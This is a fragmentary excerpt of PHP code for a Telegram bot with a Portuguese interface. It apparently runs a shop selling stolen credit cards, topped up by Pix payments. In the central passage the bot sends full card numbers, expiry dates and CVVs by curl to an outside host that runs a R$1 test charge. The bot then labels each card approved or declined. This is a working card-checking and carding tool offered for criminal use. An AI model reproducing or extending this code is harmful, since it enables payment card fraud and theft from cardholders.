...
$totalccs = (sizeof($historicocc[$chat_id]['ccs'])) ? sizeof($historicocc[$chat_id]['ccs']) : 0 ;
	...
	$botoes[] = ['text'=>"",'callback_data'=>"volta_loja"];

	$botoes[] = ['text'=>"👨‍💻 Suporte",'url'=>"{$confibot[suporte]}"];

	$botoes[] = ['text'=>"⚙️️ Dev",'url'=>"https://t.me/EUTHEUZIN"];
...
function comprasaldo($message){
	...
	$menu =  ['inline_keyboard' => [
		...
		[['text'=>"🔙️ VOLTAR",'callback_data'=>"volta_menu"] , ['text'=>'💵 ADICIONAR 10R$','callback_data'=>"pixauto"]]
...
bot("editMessageText",array( "message_id" => $message['message_id'] , "chat_id"=> $chat_id , "text" => "💠 PIX MANUAL\n_Para adicionar saldo a sua conta, envie um Pix para a seguinte chave:_\n\n*Nome*:`NOME DA LARA`\n*Chave Pix:* `SUA CHAVE AQUI`\n\n*Após o pagamento, envie o comprovante para {$confibot[userDono]}.*\n\n\n⚠ Se você enviar um valor *MENOR* que *R$ 10*, você perderá o depósito.","reply_markup" =>$menu,"reply_to_message_id"=> $message['message_id'],"parse_mode" => 'Markdown' , 'force_reply' => true , "selective" => true));
...
$txt = "✅ *Geramos automaticamente um valor fixo de R$10,00 para adição de saldo em nossa store, por favor realize o pagamento abaixo pelo link de pagamento pelo método (Pix) e aguarde alguns instantes para ser liberado o seu novo saldo!*
...
$confibot = $GLOBALS[confibot];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "storetheuzbot.com/home/debita.php?lista=".$dadoscc['cc']."|".$dadoscc['mes']."|".$dadoscc['ano']."|".$dadoscc['cvv'].""); 
...
if(strpos($chk, 'Transação Aprovada')) {
$response = "✅ Aprovada: 00 - Transação autorizada com sucesso! Debitado: R$1,00 do cartão.";
} else {
$response = "❌ Recusada: 05 - Cartão não autorizado - Transação negada [05]! Negou: R$1,00 do cartão.";
}
...
💳 | Produto:
*Card:* `".$dadoscc['cc']."|".$dadoscc['mes']."|".$dadoscc['ano']."|".$dadoscc['cvv']."`
...
$totalccs = (sizeof($historicocc[$chat_id]['ccs'])) ? sizeof($historicocc[$chat_id]['ccs']) : 0 ;
	...
	$botoes[] = ['text'=>"",'callback_data'=>"volta_menu"];

	$botoes[] = ['text'=>"👨‍💻 Suporte",'url'=>"{$confibot[suporte]}"];

	$botoes[] = ['text'=>"⚙️ Dev",'url'=>"https://t.me/EUTHEUZIN"];
